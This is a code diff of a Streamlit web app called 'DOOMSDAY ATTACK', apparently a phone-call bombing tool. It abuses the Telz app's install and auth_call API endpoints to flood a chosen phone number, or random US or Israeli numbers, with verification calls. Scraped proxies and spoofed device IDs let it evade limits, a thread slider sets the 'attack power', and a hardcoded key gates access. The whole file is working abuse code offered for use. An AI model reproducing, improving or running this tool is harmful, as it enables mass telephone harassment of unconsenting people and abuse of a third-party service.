@@ -10,18 +10,78 @@ import webbrowser
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- إعدادات الواجهة (English) ---
-st.set_page_config(page_title="DOOMSDAY ATTACK - GX3", page_icon="💀")
+# --- UI Settings and Hiding Streamlit/GitHub Logos ---
+st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")
 
 st.markdown("""
     <style>
-    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
-    .stButton>button { width: 100%; background-color: #660000; color: white; border: 2px solid #ff0000; }
-    .doom-box { border: 2px solid #ff0000; padding: 20px; border-radius: 10px; background-color: #0a0000; text-align: center; }
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
+    header {visibility: hidden;}
+    .stDeployButton {display:none;}
+    
+    .main {
+        background-color: #000000;
+        color: #ff0000;
+        font-family: 'Courier New', Courier, monospace;
+    }
+    .stTextInput>div>div>input {
+        background-color: #0a0a0a;
+        color: #ff0000;
+        border: 2px solid #ff0000;
+        text-align: center;
+    }
+    .stButton>button {
+        width: 100%;
+        background-color: #660000;
+        color: white;
+        border: 2px solid #ff0000;
+        font-weight: bold;
+        font-size: 20px;
+    }
+    .stButton>button:hover {
+        background-color: #ff0000;
+        color: black;
+    }
+    .img-container {
+        border: 5px solid #ff0000;
+        padding: 10px;
+        background-color: #1a0000;
+        box-shadow: 0 0 20px #ff0000;
+        text-align: center;
+    }
     </style>
     """, unsafe_allow_html=True)
 
-# --- تفعيل المكتبات تلقائياً (بدون حذف حرف) ---
+# --- Authentication System ---
+if 'authenticated' not in st.session_state:
+    st.session_state.authenticated = False
+
+if not st.session_state.authenticated:
+    st.markdown('<div class="img-container">', unsafe_allow_html=True)
+    st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
+    st.markdown('</div>', unsafe_allow_html=True)
+    
+    st.markdown("<h1 style='text-align: center; color: red;'>🔒 ACTIVATION SYSTEM</h1>", unsafe_allow_html=True)
+    user_key = st.text_input("Enter your access key:", type="password")
+    
+    if st.button("ACTIVATE 🔥"):
+        if user_key == "aligx3gx3":
+            st.session_state.authenticated = True
+            st.rerun()
+        else:
+            st.error("❌ Invalid Key! Contact dev for activation @PDD6P")
+    st.stop()
+
+# --- Main App ---
+st.markdown('<div class="img-container">', unsafe_allow_html=True)
+st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
+st.markdown('</div>', unsafe_allow_html=True)
+
+st.markdown("<h1 style='text-align: center; color: #ff0000; font-size: 50px;'>DOOMSDAY ATTACK</h1>", unsafe_allow_html=True)
+st.markdown("<h3 style='text-align: center; color: white;'>Channel: gx3gx3 | Dev: @PDD6P</h3>", unsafe_allow_html=True)
+
+# --- Auto-install Libs ---
 def install_libs():
     libs = ['requests', 'termcolor', 'pyfiglet']
     for lib in libs:
@@ -31,9 +91,13 @@ def install_libs():
             subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
 
 install_libs()
-import requests
 
-# --- الدوال الأصلية (كما هي تماماً) ---
+import requests
+from termcolor import colored
+import pyfiglet
+
+CH_LINK = 'https://t.me/gx3gx3'
+
 def generate_unique_ids():
     timestamp = int(time.time() * 1000)
     random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
@@ -42,95 +106,146 @@ def generate_unique_ids():
 
 def fetch_internal_proxies():
     proxies = []
-    try:
-        res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all", timeout=10)
-        if res.status_code == 200:
-            for line in res.text.splitlines():
-                if line.strip(): proxies.append(f"socks4://{line.strip()}")
-    except: pass
+    urls = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"
+    ]
+    for url in urls:
+        try:
+            res = requests.get(url, timeout=10)
+            if res.status_code == 200:
+                for line in res.text.splitlines():
+                    if ":" in line:
+                        proxies.append(line.strip())
+        except: pass
     return proxies
 
+def is_proxy_working(proxy_dict):
+    try:
+        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
+        return response.status_code == 200
+    except:
+        return False
+
 def load_proxies(filename="gx1gx1.txt"):
-    proxies = []
+    all_proxies = []
     if os.path.exists(filename):
         with open(filename, "r") as f:
-            proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
-    proxies.extend(fetch_internal_proxies())
-    return list(set(proxies))
+            all_proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
+    
+    internal = fetch_internal_proxies()
+    all_proxies.extend(internal)
+    return list(set(all_proxies))
 
-def get_random_proxy(proxies):
-    if not proxies: return None
-    p = random.choice(proxies)
-    return {"http": p, "https": p}
+def get_working_proxy(proxies_list):
+    for _ in range(10):
+        if not proxies_list: return None
+        raw_proxy = random.choice(proxies_list)
+        if not raw_proxy.startswith(("http", "socks")):
+            proxy_url = f"http://{raw_proxy}"
+        else:
+            proxy_url = raw_proxy
+        
+        proxy_dict = {"http": proxy_url, "https": proxy_url}
+        if is_proxy_working(proxy_dict):
+            return proxy_dict
+    return None
 
 def send_install_request(url, headers, payload, proxy=None):
     try:
-        r = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
-        return r.ok and "ok" in r.text
+        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
+        return response.ok and "ok" in response.text
     except: return False
 
 def send_auth_call_request(url, headers, payload, proxy=None):
     try:
-        r = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
-        return r.ok and "ok" in r.text
+        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
+        return response.ok and "ok" in response.text
     except: return False
 
-# --- واجهة المستخدم ---
-st.markdown('<div class="doom-box">', unsafe_allow_html=True)
-st.image("https://files.catbox.moe/3cq9i1.jpg") # شعار القناة
-st.title("G X 3 - ATTACK PANEL")
-st.write("Channel: @gx3gx3 | Dev: @PDD6P")
-st.markdown('</div>', unsafe_allow_html=True)
+if 'stats' not in st.session_state:
+    st.session_state.stats = {"ok": 0, "error": 0}
+if 'running' not in st.session_state:
+    st.session_state.running = False
+if 'current_target' not in st.session_state:
+    st.session_state.current_target = ""
 
-# حالة العدادات
-if 'ok' not in st.session_state: st.session_state.ok = 0
-if 'err' not in st.session_state: st.session_state.err = 0
-if 'running' not in st.session_state: st.session_state.running = False
+# --- Input Interface ---
+attack_mode = st.radio("Select Target Mode:", ["Manual Entry", "Random USA Attack 🇺🇸", "Random Israel Attack 🇮🇱"])
 
-# الإعدادات
-mode = st.selectbox("Select Target Mode:", ["Manual Entry", "USA Random 🇺🇸", "Israel Random 🇮🇱"])
-if mode == "Manual Entry":
-    c_code = st.text_input("Country Code (e.g. 964):", "964")
-    number = st.text_input("Phone Number:")
-elif mode == "USA Random 🇺🇸":
-    c_code, number = "1", "RANDOM"
+if attack_mode == "Manual Entry":
+    col1, col2 = st.columns(2)
+    with col1:
+        c_code = st.text_input("🌍 Country Code (No +):", value="964")
+    with col2:
+        num_input = st.text_input("📱 Phone Number (No prefix):")
+elif attack_mode == "Random USA Attack 🇺🇸":
+    c_code = "1"
+    num_input = "RANDOM"
 else:
-    c_code, number = "972", "RANDOM"
+    c_code = "972"
+    num_input = "RANDOM"
 
-threads = st.slider("Attack Power (Threads):", 1, 100, 20)
+threads_count = st.slider("☣️ Attack Power (Threads):", 1, 100, 15)
 
-# محرك الهجوم
-def attack_logic(country_code, target_num):
-    proxies = load_proxies()
-    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
-    langs = ["en", "fr", "de", "tr", "es", "ar", "he", "ru"]
+def worker_task(country_code, target_number):
+    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
+    proxies_list = load_proxies()
     
+    install_url = "https://api.telz.com/app/install"
+    auth_call_url = "https://api.telz.com/app/auth_call"
+    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
+
+    placeholder = st.empty()
+
     while st.session_state.running:
-        current_num = target_num if target_num != "RANDOM" else "".join(random.choices(string.digits, k=9))
-        ts, fox, u_uuid = generate_unique_ids()
-        proxy = get_random_proxy(proxies)
+        # Determine actual number to attack
+        if target_number == "RANDOM":
+            final_num = "".join(random.choices(string.digits, k=9))
+        else:
+            final_num = target_number
         
-        payload = json.dumps({"android_id": fox, "app_version": "17.5.17", "event": "install", "ts": ts, "uuid": str(u_uuid)})
-        
-        if send_install_request("https://api.telz.com/app/install", headers, payload, proxy):
-            auth_payload = json.dumps({"android_id": fox, "phone": f"+{country_code}{current_num}", "ts": ts, "uuid": str(u_uuid), "event": "auth_call", "lang": random.choice(langs)})
-            if send_auth_call_request("https://api.telz.com/app/auth_call", headers, auth_payload, proxy):
-                st.session_state.ok += 1
-            else: st.session_state.ok += 0 # Failed call
-        st.session_state.err += 1 # Any attempt counts
+        st.session_state.current_target = f"+{country_code}{final_num}"
+
+        foxx, fox, foxer = generate_unique_ids()
+        random_android_version = str(random.randint(7, 14))
+        random_lang = random.choice(foreign_langs)
+        proxy = get_working_proxy(proxies_list)
+
+        payload_install = json.dumps({
+            "android_id": fox, "app_version": "17.5.17", "event": "install",
+            "google_exists": "yes", "os": "android", "os_version": random_android_version,
+            "play_market": True, "ts": foxx, "uuid": str(foxer)
+        })
+
+        try:
+            if send_install_request(install_url, headers, payload_install, proxy):
+                payload_auth_call = json.dumps({
+                    "android_id": fox, "app_version": "17.5.17", "attempt": "0",
+                    "event": "auth_call", "lang": random_lang, "os": "android",
+                    "os_version": random_android_version, "phone": st.session_state.current_target,
+                    "ts": foxx, "uuid": str(foxer)
+                })
+                if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
+                    st.session_state.stats["ok"] += 1
+                else: st.session_state.stats["error"] += 1
+            else: st.session_state.stats["error"] += 1
+        except: st.session_state.stats["error"] += 1
+
+        with placeholder.container():
+            st.error(f"🎯 ATTACKING: {st.session_state.current_target}")
+            st.metric("🔥 SUCCESSFUL HITS", st.session_state.stats["ok"])
+            st.metric("💀 FAILED ATTEMPTS", st.session_state.stats["error"])
         time.sleep(0.01)
 
-# أزرار التحكم
-col1, col2 = st.columns(2)
-with col1:
-    if st.button("🔥 START ATTACK"):
+if st.button("⚠️ LAUNCH ATTACK"):
+    if num_input:
         st.session_state.running = True
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            for _ in range(threads): executor.submit(attack_logic, c_code, number)
-with col2:
-    if st.button("🛑 STOP"):
-        st.session_state.running = False
-        st.rerun()
+        worker_task(c_code, num_input)
+    else:
+        st.error("Enter a number or select random mode!")
 
-# العدادات الحية
-st.subheader(f"✅ Success: {st.session_state.ok} | ❌ Total Attempts: {st.session_state.err}")
+if st.button("❌ STOP"):
+    st.session_state.running = False
+    st.warning("Attack Terminated.")
+
